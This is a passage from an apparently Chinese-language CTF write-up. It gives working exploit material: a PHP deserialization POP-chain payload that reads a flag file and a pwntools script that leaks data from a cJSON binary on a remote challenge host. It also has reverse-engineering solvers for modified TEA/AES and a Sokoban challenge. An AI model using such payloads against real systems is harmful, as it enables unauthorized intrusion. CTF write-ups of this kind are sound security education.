$exGoDOPm; public $TEODq2c3Uo; public function __construct(){ $this-\u0026gt;exGoDOPm = new SKVnfvfbas(); $this-\u0026gt;TEODq2c3Uo = new \\stdClass(); } } class SKVnfvfbas{ public $UOvWbl; public $m4pnFndZoX; public function __construct(){ $this-\u0026gt;UOvWbl = new T6Y5QYS(); $this-\u0026gt;m4pnFndZoX = new \\stdClass(); } } class T6Y5QYS{ public $p9mwE7l; public $aysl2yR5g; public function __construct(){ $this-\u0026gt;p9mwE7l = new Ronyv7u(); $this-\u0026gt;aysl2yR5g = new \\stdClass(); } } class Ronyv7u{ public $uDQ0ehd4p; public $uqkULP0XD; public function __construct(){ $this-\u0026gt;uDQ0ehd4p = new d9vgRnlEA(); $this-\u0026gt;uqkULP0XD = new \\stdClass(); } } class d9vgRnlEA{ public $T4rUU9R; public function __construct(){ $this-\u0026gt;T4rUU9R = new Xl5V1fEbzD(); } } class Xl5V1fEbzD{ public $fgVgm4TV97; public function __construct(){ $this-\u0026gt;fgVgm4TV97 = new xEFW8yw08(); } } class xEFW8yw08{ public $nYuAuh2; public function __construct(){ $this-\u0026gt;nYuAuh2 = new Ugh4SYk00D(); } } class Ugh4SYk00D{ public $tQF7ER; public function __construct(){ $this-\u0026gt;tQF7ER = new AN9pNsmlT(); } } class AN9pNsmlT{ public $Ipz7D3; public function __construct(){ $this-\u0026gt;Ipz7D3 = new \\stdClass(); } } echo urlencode(serialize(new amg2Vw()));} 同时对pop链中的所有编码过程进行逆向，得到最终要进行读 /fumo 的编码结果：\n\u0026lt;?php $fp = fopen(\u0026#34;popchain.txt\u0026#34;, \u0026#34;r\u0026#34;); $payload = \u0026#39;/fumo\u0026#39;; $line = fgets($fp); $list = array(); while(! feof($fp)) { $line = fgets($fp);//fgets()函数从文件指针中读取一行  array_push($list, trim($line)); $line = trim(explode(\u0026#34; \u0026#34;,$line)[3]); echo $line.\u0026#34;\\n\u0026#34;; if($line === \u0026#34;pass\u0026#34;) { continue; } else if($line === \u0026#34;base64_decode\u0026#34;) { $payload = base64_encode($payload); } else if($line === \u0026#34;ucfirst\u0026#34;) { continue; } else if($line === \u0026#34;strrev\u0026#34;) { $payload = strrev($payload); } else if($line === \u0026#34;str_rot13\u0026#34;) { $payload = str_rot13($payload); } } echo $payload.\u0026#34;\\n\u0026#34;; $list = array_reverse($list); foreach($list as $line){ $line = explode(\u0026#34; \u0026#34;,$line)[3]; if($line === \u0026#34;pass\u0026#34;) { continue; } else if($line === \u0026#34;base64_decode\u0026#34;) { $payload = base64_decode($payload); } else if($line === \u0026#34;ucfirst\u0026#34;) { continue; } else if($line === \u0026#34;strrev\u0026#34;) { $payload = strrev($payload); } else if($line === \u0026#34;str_rot13\u0026#34;) { $payload = str_rot13($payload); } } echo $payload; fclose($fp); 最终序列化链：\nO%3A20%3A%22christmasTree%5Camg2Vw%22%3A1%3A%7Bs%3A9%3A%22PCR49GlRM%22%3BO%3A24%3A%22christmasTree%5CvS1qenzGWr%22%3A2%3A%7Bs%3A7%3A%22yrVWMn9%22%3BO%3A22%3A%22christmasTree%5CGGcIkQ6E%22%3A2%3A%7Bs%3A8%3A%22CK5OgoyC%22%3BO%3A24%3A%22christmasTree%5CuGnuU5pGgQ%22%3A2%3A%7Bs%3A10%3A%22XbW5o6yiGv%22%3BO%3A24%3A%22christmasTree%5CezlgUUHCdQ%22%3A1%3A%7Bs%3A6%3A%22fDViVU%22%3BO%3A21%3A%22christmasTree%5Cp6NArTi%22%3A2%3A%7Bs%3A10%3A%22VbpsE7wqUH%22%3BO%3A20%3A%22christmasTree%5CxT506K%22%3A2%3A%7Bs%3A6%3A%22Dblxvn%22%3BO%3A24%3A%22christmasTree%5Cu1q3m04qZb%22%3A1%3A%7Bs%3A9%3A%22NGIlAGGLv%22%3BO%3A22%3A%22christmasTree%5Cc76So3oF%22%3A2%3A%7Bs%3A8%3A%22cwQWOIEL%22%3BO%3A24%3A%22christmasTree%5CeHSt3I5L30%22%3A2%3A%7Bs%3A6%3A%22exoEH1%22%3BO%3A24%3A%22christmasTree%5CFK0LfIlrxm%22%3A2%3A%7Bs%3A10%3A%22gZ9IzdbF6T%22%3BO%3A22%3A%22christmasTree%5Co5d0ioNZ%22%3A2%3A%7Bs%3A8%3A%22exGoDOPm%22%3BO%3A24%3A%22christmasTree%5CSKVnfvfbas%22%3A2%3A%7Bs%3A6%3A%22UOvWbl%22%3BO%3A21%3A%22christmasTree%5CT6Y5QYS%22%3A2%3A%7Bs%3A7%3A%22p9mwE7l%22%3BO%3A21%3A%22christmasTree%5CRonyv7u%22%3A2%3A%7Bs%3A9%3A%22uDQ0ehd4p%22%3BO%3A23%3A%22christmasTree%5Cd9vgRnlEA%22%3A1%3A%7Bs%3A7%3A%22T4rUU9R%22%3BO%3A24%3A%22christmasTree%5CXl5V1fEbzD%22%3A1%3A%7Bs%3A10%3A%22fgVgm4TV97%22%3BO%3A23%3A%22christmasTree%5CxEFW8yw08%22%3A1%3A%7Bs%3A7%3A%22nYuAuh2%22%3BO%3A24%3A%22christmasTree%5CUgh4SYk00D%22%3A1%3A%7Bs%3A6%3A%22tQF7ER%22%3BO%3A23%3A%22christmasTree%5CAN9pNsmlT%22%3A1%3A%7Bs%3A6%3A%22Ipz7D3%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7D%7D%7D%7Ds%3A9%3A%22uqkULP0XD%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A9%3A%22aysl2yR5g%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A10%3A%22m4pnFndZoX%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A10%3A%22TEODq2c3Uo%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A8%3A%22Q7mg44bg%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A6%3A%22UO4yLd%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A7%3A%22rHYG3Wr%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7Ds%3A8%3A%22sPEbogX4%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A9%3A%22yKwNrpRAQ%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7Ds%3A6%3A%22XEH9BQ%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A6%3A%22Vkyud3%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7Ds%3A9%3A%22S839pvNRU%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7D 然后调用的参数：9ADRPhlSX1UYKREV 即可读到 /fumo\nPwn dataleak 核心是调用了 cJSON_Minify 这个函数，这个函数差不多就是省略调所有的注释，读给的 libc 的源码可以发现，/* 在判断 \\x00 后仍然有 +=2 这个操作于是可以弥补调读入 0xe 剩下的两个空字节，然后可以分段泄露出data\nfrom pwn import * import sys context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./cJSON_PWN\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc-2.23.so\u0026#34;) else: p = remote(\u0026#34;124.70.202.226\u0026#34;, 2101) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) elf = ELF(\u0026#39;./cJSON_PWN\u0026#39;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) debugf(0x120D) # sn(b\u0026#34;a\u0026#34;*14) # sn(p64(elf.got[\u0026#34;read\u0026#34;])) sn(b\u0026#34;aaaaaaaaaaa/*a\u0026#34;) sn(b\u0026#34;aaaaa/*\u0026#34; + b\u0026#34;b\u0026#34;*7) sn(b\u0026#34;aaaaa/*\u0026#34; + b\u0026#34;a\u0026#34;*7) sn(b\u0026#34;/*\u0026#34; + b\u0026#34;b\u0026#34;*12) p.interactive() Re godness dance 输入长度 28\n上来是个哈希表做字母频率统计，i 和 u 出现两次，其余 a-z 出现一次\n然后将 0-28 依次放到一个数组里，看了一下密文，发现也是 0-28\n后面的逻辑每分析出来，于是尝试选择明文攻击（后来得知后面的逻辑只是混淆）\ninput: abcdefghijklmnopqrstuvwxyziu output: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 27, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 26 input: abcdefghijklmnopqrstuvwxyzui output: 0, 1, 2, 3, 4, 5, 6, 7, 8, 28, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 27, 21, 22, 23, 24, 25, 26 input: abcdefghijklmnopqrstuvwxyizu output: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 26, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 27 input: zyxwvutsrqponmlkjihgfedcbaiu output: 0, 26, 25, 24, 23, 22, 21, 20, 19, 18, 27, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 28, 6, 5, 4, 3, 2, 1 input: bacdefghijklmnopqrstuvwxyziu output: 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 27, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 26 flag: waltznymphforquickjigsvexbud target: 0, 2, 26, 17, 28, 24, 11, 21, 10, 16, 20, 19, 18, 3, 8, 6, 12, 9, 14, 13, 22, 4, 27, 15, 23, 1, 25, 7, 5 根据动调的结果，判断最后的密文就是把 a-z 的 index 依次放上来\n手动还原 flag\nCPlusExceptionEncrypt 异常处理，在所有的 begin_catch 下面下断点就能恢复流程\n第一个加密是魔改后的tea\nv0 += (sum + i) ^ (((v1 \u0026gt;\u0026gt; 5) + k3) ^ (sum1 + v1) ^ ((v1 \u0026lt;\u0026lt; 4) + k2)) v1 += (sum + i) ^ (((v0 \u0026gt;\u0026gt; 5) + k1) ^ (sum1 + v0) ^ ((v0 \u0026lt;\u0026lt; 4) + k0)) tea 之后对计算结果依次异或 s, c, t, f\n随后进行 AES 轮密钥生成，对拍发现没有魔改\n接下来是魔改后的 AES：\n 修改了最开始的轮密钥加：每个字节另外异或 0x66 随后执行的应该是 9 轮加密  subbyte 用的是 inv_s_box 然后用的是 inv_shift_rows 然后是正向列混淆 正向的轮密钥加   最后是正常的字节替换，行移位和轮密钥加  解密脚本：\naes.py\nfrom galois import GF2 as _GF2 _aes_s_box = [ [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76], [0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0], [0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15], [0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75], [0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84], [0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf], [0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8], [0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2], [0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73], [0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb], [0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79], [0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08], [0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a], [0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e], [0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf], [0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16] ] _aes_s_box_inverse = [ [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb], [0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb], [0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e], [0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25], [0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92], [0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84], [0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06], [0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b], [0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73], [0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e], [0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b], [0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4], [0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f], [0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef], [0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61], [0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d] ] def _convert_to_array(plain_int): plain_array = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] for i in range(4)[::-1]: for j in range(4)[::-1]: plain_array[j][i] = plain_int \u0026amp; 0xff plain_int \u0026gt;\u0026gt;= 8 return plain_array def _get_num_from_sbox(index): row = (index \u0026amp; 0xf0) \u0026gt;\u0026gt; 4 col = index \u0026amp; 0xf return _aes_s_box[row][col] def _get_num_from_sbox_inverse(index): row = (index \u0026amp; 0xf0) \u0026gt;\u0026gt; 4 col = index \u0026amp; 0xf return _aes_s_box_inverse[row][col] def _sub_bytes(input_array): for i in range(4): for j in range(4): input_array[i][j] = _get_num_from_sbox(input_array[i][j]) def _sub_bytes_inverse(input_array): for i in range(4): for j in range(4): input_array[i][j] = _get_num_from_sbox_inverse(input_array[i][j]) def _shift_rows(input_array): input_array[1] = input_array[1][1:] + [input_array[1][0]] input_array[2] = input_array[2][2:] + input_array[2][:2] input_array[3] = [input_array[3][3]] + input_array[3][:3] def _shift_rows_inverse(input_array): input_array[3] = input_array[3][1:] + [ input_array[3][0] ] input_array[2] = input_array[2][2:] + input_array[2][:2] input_array[1] = [ input_array[1][3] ] + input_array[1][:3] columns_matrix = [ [2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2] ] def _mix_columns(input_array): res_array = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] for i in range(4): for j in range(4): res = _GF2(0) for k in range(4): res += _GF2(columns_matrix[i][k]) * _GF2(input_array[k][j]) res %= _GF2(0b100011011) res_array[i][j] = res.data return res_array columns_matrix_inverse = [ [0xe, 0xb, 0xd, 0x9], [0x9, 0xe, 0xb, 0xd], [0xd, 0x9, 0xe, 0xb], [0xb, 0xd, 0x9, 0xe] ] def _mix_columns_inverse(input_array): res_array = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] for i in range(4): for j in range(4): res = _GF2(0) for k in range(4): res += _GF2(columns_matrix_inverse[i][k]) * _GF2(input_array[k][j]) res %= _GF2(0b100011011) res_array[i][j] = res.data return res_array def _add_round_key(input_array, key_array): for i in range(4): for j in range(4): input_array[i][j] ^= key_array[i][j] def _key_schedule(pre_key, round): next_key = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] # print (pre_key) for i in range(4): next_key[i][0] = pre_key[i - 3][3] _sub_bytes(next_key) for i in range(4): next_key[i][0] ^= pre_key[i][0] next_key[0][0] ^= (_GF2(pow(2, round)) % _GF2(0x11b)).data for i in range(1, 4): for j in range(4): next_key[j][i] = next_key[j][i - 1] ^ pre_key[j][i] return next_key def _aes_key_gen(key): key = _convert_to_array(key) round_key = [key] for i in range(10): round_key.append(_key_schedule(round_key[i], i)) return round_key def _convert_to_int(input_array): output_int = 0 for i in range(4): for j in range(4): output_int \u0026lt;\u0026lt;= 8 output_int |= input_array[j][i] return output_int def sycaes_encrypt(plain_text, key): plain_text ^= key round_key = _aes_key_gen(key) plain_array = _convert_to_array(plain_text) for i in range(1, 10): _sub_bytes_inverse(plain_array) _shift_rows_inverse(plain_array) plain_array = _mix_columns(plain_array) _add_round_key(plain_array, round_key[i]) _sub_bytes(plain_array) _shift_rows(plain_array) _add_round_key(plain_array, round_key[10]) return _convert_to_int(plain_array) def sycaes_decrypt(cipher_text, key): round_key = _aes_key_gen(key)[::-1] cipher_array = _convert_to_array(cipher_text) _add_round_key(cipher_array, round_key[0]) _shift_rows_inverse(cipher_array) _sub_bytes_inverse(cipher_array) for i in range(1, 10): _add_round_key(cipher_array, round_key[i]) cipher_array = _mix_columns_inverse(cipher_array) _shift_rows(cipher_array) _sub_bytes(cipher_array) _add_round_key(cipher_array, round_key[10]) return _convert_to_int(cipher_array) from libnum import * k = \u0026#34;Welcome_to_sctf!\u0026#34; ex_key = _aes_key_gen(s2n(k)) cipher = [ 0xBE, 0x1C, 0xB3, 0xF3, 0xA1, 0xF4, 0xE4, 0x63, 0x11, 0xE1, 0x1C, 0x6B, 0x54, 0x0A, 0xDF, 0x74, 0xF2, 0x93, 0x55, 0xDA, 0x48, 0xFC, 0xA2, 0x3C, 0x89, 0x63, 0x2E, 0x7F, 0x8D, 0xA4, 0x6D, 0x4E ] tmp = 0 for c in cipher[:16]: tmp \u0026lt;\u0026lt;= 8 tmp += c res = n2s(sycaes_decrypt(tmp, s2n(k))) print (s2n(res[:4][::-1])) print (s2n(res[4:8][::-1])) print (s2n(res[8:12][::-1])) print (s2n(res[12:][::-1])) tmp = 0 for c in cipher[16:]: tmp \u0026lt;\u0026lt;= 8 tmp += c res = n2s(sycaes_decrypt(tmp, s2n(k))) print (s2n(res[:4][::-1])) print (s2n(res[4:8][::-1])) print (s2n(res[8:12][::-1])) print (s2n(res[12:][::-1])) galois.py\nclass GF2: def __init__(self, v): self.data = v def __str__(self): return hex(self.data) def __repr__(self): return \u0026#34;GF2(0x%x)\u0026#34; % self.data def __add__(self, other): return GF2(self.data ^ other.data) def __sub__(self, other): return GF2(self.data ^ other.data) def __lshift__(self, other): return GF2(self.data \u0026lt;\u0026lt; other) def __eq__(self, other): if type(other) == type(1): if self.data == other: return True else: return False if type(other) == type(self): if self.data == other.data: return True else: return False return False def __mul__(self, other): ans = 0 for i in range(len(bin(self.data)) - 2): if self.data \u0026amp; (1 \u0026lt;\u0026lt; i): ans ^= other.data \u0026lt;\u0026lt; i return GF2(ans) def __truediv__(self, other): a = self b = other if b.data == 1: return a lena = len(bin(a.data)) - 2 lenb = len(bin(b.data)) - 2 ans = 0 while lena \u0026gt;= lenb: a = a + (b \u0026lt;\u0026lt; lena - lenb) ans += 1 \u0026lt;\u0026lt; (lena - lenb) lena = len(bin(a.data)) - 2 return GF2(ans) def __floordiv__(self, other): return self / other def __isub__(self, other): return self - other def __mod__(self, other): a = self.data b = other.data lena = len(bin(a)) - 2 lenb = len(bin(b)) - 2 for i in range(lena, lenb - 1, -1): if a \u0026amp; (1 \u0026lt;\u0026lt; i - 1) != 0: a ^= (b \u0026lt;\u0026lt; i - lenb) return GF2(a) def __pow__(self, other, modulo = None): d = GF2(1) while other \u0026gt; 0: if other \u0026amp; 1: d = d * self if modulo != None: d %= modulo other \u0026gt;\u0026gt;= 1 self *= self if modulo != None: self %= modulo return d tea.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt;  //加密函数 void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=1935897702; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += (sum + i )^(((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3)); v1 += (sum + i )^(((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1)); } /* end cycle */ v[0]=v0; v[1]=v1; } //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t delta=1935897702; /* a key schedule constant */ uint32_t v0=v[0], v1=v[1], sum=delta * 32; int i; /* set up */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=31; i\u0026gt;=0; i--) { /* basic cycle start */ v1 -= (sum + i )^(((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1)); v0 -= (sum + i )^(((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3)); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } int main(){ v[0] = \u0026#39;s\u0026#39; ^ 0x66666666 ^ 2650095043; v[1] = \u0026#39;c\u0026#39; ^ 0x66666666 ^ 1257176610; v[2] = \u0026#39;t\u0026#39; ^ 0x66666666 ^ 407123268; v[3] = \u0026#39;f\u0026#39; ^ 0x66666666 ^ 3718944108; v[4] = \u0026#39;s\u0026#39; ^ 0x66666666 ^ 703929021; v[5] = \u0026#39;c\u0026#39; ^ 0x66666666 ^ 1889742860; v[6] = \u0026#39;t\u0026#39; ^ 2436073003 ^ 0x66666666; v[7] = \u0026#39;f\u0026#39; ^ 2423013887 ^ 0x66666666; decrypt(v, k); decrypt(v+2, k); decrypt(v+4, k); decrypt(v+6, k); printf(\u0026#34;0x%x, 0x%x, \u0026#34;,v[0],v[1]); printf(\u0026#34;0x%x, 0x%x, \u0026#34;,v[2],v[3]); printf(\u0026#34;0x%x, 0x%x, \u0026#34;,v[4],v[5]); printf(\u0026#34;0x%x, 0x%x\\n\u0026#34;,v[6],v[7]); return 0; } SycOS riscv 架构，ghidra 打开\n读取 0x40 长度，每个字符分别计算 0x80 次线性同余方程，然后分两部分存储\n0x10 轮加密，依次进行：tea 运算、两部分中各取出 0x100 进行交换，然后进行系统调用，动调发现内核中的处理只是把两部分字符串做了交换\n 系统调用可以根据 \u0026ldquo;sys call\u0026rdquo; 字符串定位到\n tea 的加密一个是 16 轮的一个是 8 轮\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026#34;exp.h\u0026#34;int delta=-0x61c88647; char str[65]; char tmp[256]; char tmp1[4096]; unsigned long long seed; unsigned long long mRand() { seed=seed*0x41c64e6d+0x3039; return (seed\u0026lt;\u0026lt;0x21)\u0026gt;\u0026gt;0x31; } void tea1(char *str) { for (int j=0;j\u0026lt;4096;j+=8) { auto *ptr=(unsigned int*)(str+j); auto t1=ptr[0]; auto t2=ptr[1]; int sum=delta*16; for (int k=0;k\u0026lt;16;k++) { t2 -= t1 + sum ^ (t1\u0026lt;\u0026lt;4) + 0x1A2B3C4D ^ (t1 \u0026gt;\u0026gt; 5) + 0xCC1122AA; t1 -= (t2\u0026lt;\u0026lt;4) + 0x11222233 ^ (t2 \u0026gt;\u0026gt; 5) + 0xaabbccdd ^ sum +t2; sum-=delta; } ptr[0]=t1; ptr[1]=t2; } } void tea2(char* str) { for (int j=0;j\u0026lt;4096;j+=8) { auto *ptr=(unsigned int*)(str+j); auto t1=ptr[0]; auto t2=ptr[1]; int sum=delta*8; for (int k=0;k\u0026lt;8;k++) { sum-=delta; t1 += t2 + sum ^ (t2 \u0026lt;\u0026lt;4) + 0x11222233 ^ (t2 \u0026gt;\u0026gt; 5) + 0xaabbccdd; t2 +=(t1\u0026lt;\u0026lt;4) + 0x1A2B3C4D ^ (t1 \u0026gt;\u0026gt; 5) + 0xCC1122AA ^ sum +t1; } ptr[0]=t1; ptr[1]=t2; } } void panic() { printf(\u0026#34;failed\u0026#34;); exit(0); } int main() { for (int i=15;i\u0026gt;=0;i--) { memcpy(tmp1,target1,4096); memcpy(target1,target2,4096); memcpy(target2,tmp1,4096); memcpy(tmp,target1+(i*256),256); memcpy(target1+(i*256),target2+(15-i)*256,256); memcpy(target2+(15-i)*256,tmp,256);\ttea1(target1); tea2(target2); } for (int i=0;i\u0026lt;0x80;i++) printf(\u0026#34;0x%02x \u0026#34;,(unsigned char)target2[i]); printf(\u0026#34;\\n\\n\u0026#34;); for (int i=0;i\u0026lt;0x20;i++) { int an=0; for (an=i;an\u0026lt;i+0xff;an++) { seed=an; bool ch=true; for (int j=0;j\u0026lt;0x80;j++) { unsigned char aa=mRand()\u0026amp;0xff; unsigned char bb=target1[i*0x80+j]\u0026amp;0xff; if (aa!=bb) { ch=false; break; } } if (ch) break; } printf(\u0026#34;%x\\n\u0026#34;,an); if (an\u0026gt;=0xff) { panic(); } str[i]=an-i; } for (int i=0;i\u0026lt;0x20;i++) { int an=0; for (an=i;an\u0026lt;i+0xff;an++) { seed=an; bool ch=true; for (int j=0;j\u0026lt;0x80;j++) { unsigned char aa=mRand()\u0026amp;0xff; unsigned char bb=target2[i*0x80+j]\u0026amp;0xff; if (aa!=bb) { ch=false; break; } } if (ch) break; } printf(\u0026#34;%x\\n\u0026#34;,an); if (an\u0026gt;=0xff) { panic(); } str[i+0x20]=an-i; } printf(\u0026#34;%s\\n\u0026#34;,str); return 0; } SycGame 推箱子游戏\ngithub 找了个自动求解脚本，然后在脚本里加一个 alarm，求解一次的时间超过 3s 就自动退出\nhttps://github.com/tonyling/skb-solver\n题目的程序和 github 上的脚本写的都有点问题，最后大概是脚本有 1/5 到 1/10 的概率求解出一轮，接下来爆破一波就行（服务器第一天不太稳定，爆破完不回显 flag\u0026hellip;）\nfrom pwn import * from sympy.ntheory.modular import isprime import traceback context.log_level=\u0026#39;debug\u0026#39; def bprint(lst): for i in lst: for j in i: print(\u0026#34;%4d\u0026#34;%j,end=\u0026#39;\u0026#39;) print(\u0026#39;\u0026#39;) def fprint(lst): mpc={1:\u0026#39; \u0026#39;,0:\u0026#39;#\u0026#39;,-2:\u0026#39;@\u0026#39;,-3:\u0026#39;.\u0026#39;,-1:\u0026#39;$\u0026#39;} target=\u0026#39;20\\n\u0026#39; for i in lst: for j in i: 